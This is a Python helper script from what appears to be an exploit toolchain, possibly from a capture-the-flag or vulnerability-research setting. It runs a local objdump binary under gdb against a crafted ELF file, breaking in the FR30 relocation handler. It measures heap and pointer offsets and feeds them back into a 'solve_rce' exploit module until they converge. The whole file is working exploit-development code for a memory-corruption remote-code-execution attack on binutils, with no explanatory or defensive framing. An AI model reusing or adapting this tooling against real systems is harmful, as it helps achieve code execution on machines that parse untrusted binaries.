#!/usr/bin/env python3
"""Auto-calibrate R and other heap offsets for solve_rce."""
import subprocess, re, sys

OBJDUMP = "./objdump"
GDB_CMD = """
set pagination off
break fr30_elf_i32_reloc
run -g poc_rce.bin
printf "R=%ld IO=%ld S=%ld B=%ld LV=%ld WV=%ld\\n", (long)((unsigned long)reloc_entry-(unsigned long)data), (long)((unsigned long)abfd->iostream-(unsigned long)data), (long)((unsigned long)&input_section->size-(unsigned long)data), (long)((unsigned long)abfd-(unsigned long)data), (long)(*(unsigned long*)((char*)abfd->iostream+136)-(unsigned long)data), (long)(*(unsigned long*)((char*)abfd->iostream+160)-(unsigned long)data)
"""

def calibrate():
    import solve_rce
    for attempt in range(5):
        elf = solve_rce.build("local")
        with open("poc_rce.bin", "wb") as f:
            f.write(elf)

        result = subprocess.run(
            ["gdb", "-batch", "-nx"] + sum((["-ex", l.strip()] for l in GDB_CMD.strip().split("\n") if l.strip()), []) + [OBJDUMP],
            capture_output=True, text=True, timeout=30
        )

        m = re.search(r"R=(\d+) IO=(\d+) S=(\d+) B=(-?\d+) LV=(\d+) WV=(\d+)", result.stdout)
        if not m:
            print(f"Attempt {attempt}: GDB failed")
            continue

        R, IO, S, B, LV, WV = [int(x) for x in m.groups()]
        cur = solve_rce.PR["local"]

        if cur["R"] == R and cur["IO"] == IO and cur["S"] == S:
            print(f"Converged: R={R} IO={IO} S={S} B={B} LV={LV} WV={WV}")
            return True

        print(f"Attempt {attempt}: R={R} IO={IO} S={S} B={B} LV={LV} WV={WV}")
        cur["R"] = R; cur["IO"] = IO; cur["S"] = S
        cur["B"] = B; cur["LV"] = LV; cur["WV"] = WV

    print("Failed to converge after 5 attempts")
    return False

if __name__ == "__main__":
    calibrate()
